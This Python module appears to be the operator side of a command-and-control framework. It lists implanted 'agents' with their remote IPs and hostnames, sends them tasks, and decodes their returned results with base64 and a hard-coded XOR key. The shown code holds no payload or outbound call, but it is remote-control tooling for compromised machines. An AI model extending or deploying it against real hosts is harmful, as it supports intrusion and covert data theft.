from collections import OrderedDict
from util import *
import time
import random
import base64
from urllib.parse import unquote

agents = OrderedDict()

def update_agents():
    global agents

    agentsinDB = readFromDB(agentsDB)
    agents = OrderedDict()
    for agent in agentsinDB:
        agents[agent.name] = agent

def list_agents():
    update_agents()
    success("Active Agents")
    for i in agents:
        print(f"\\-- {agents[i].name} | {agents[i].remoteip} | {agents[i].hostname}")

def interact_agents(args):
    update_agents()
    if len(args) != 1:
        error("Wrong arguments")
    else:
        name = args[0]
        agents[name].interact()

def clearAgentTasks(name):
    update_agents()
    agents[name].clearTasks()

def displayResults(name,result):
    update_agents()
    if result == "":
        success("Agent {} completed his task.".format(name))
    else:
        success("Agent {} returned results : ".format(name))
        try:
            result = unquote(result)
            result = base64.b64decode(result).decode()
            key = "NOAH"
            decrypted = ""
            for i in range(len(result)):
                decrypted += chr(ord(result[i]) ^ ord(key[i % len(key)]))
            print(decrypted)
        except Exception as e:
            print("Error:", str(e))

